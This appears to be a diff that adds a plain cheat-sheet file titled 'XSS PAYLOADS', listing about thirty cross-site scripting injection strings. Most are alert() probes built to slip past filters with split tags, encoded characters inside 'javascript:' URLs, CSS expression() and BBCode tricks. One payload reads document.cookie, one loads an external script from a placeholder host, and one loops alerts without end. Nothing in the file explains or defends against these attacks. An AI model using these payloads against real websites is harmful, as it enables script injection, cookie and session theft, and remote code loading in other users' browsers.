@@ -1,0 +1,69 @@
+XSS PAYLOADS 
+
+<script>alert(1);</script>
+
+<script>alert('XSS');</script>
+
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+<IMG SRC=javascript:alert('XSS')>
+
+<scr<script>ipt>alert('XSS');</scr</script>ipt>
+
+'><script>alert(0)</script>
+
+<img src=foo.png onerror=alert(/xssed/) />
+
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
+
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
+
+<marquee><script>alert('XSS')</script></marquee>
+
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+
+<script src=http://yoursite.com/your_files.js></script>
+
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
+
+</textarea><script>alert(/xss/)</script>
+
+</textarea>''><script>alert(document.cookie)</script>
+
+''></title><script>alert(1111)</script>
+
+<body onLoad='while(true) alert('XSS');'>
+
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+'><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert('XSS')>
+
+'><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert('XSS')>
+
+</script><script>alert(1)</script>
+
+</br style=a:expression(alert())>
+
+<scrscriptipt>alert(1)</scrscriptipt>
+
+<scrscriptipt>alert(1)</scrscriptipt>
+
+<br size=\"&{alert('XSS')}\">
+
+<BASE HREF='javascript:alert('XSS');//'>
+
+[color=red width=expression(alert(123))][color]
+
+<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
+
+' onfocus=alert(document.domain) '> <'
+
+<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>
+
+mi[color=red width=expression(alert(123))][color]
+
+'>><marquee><h1>XSS</h1></marquee>
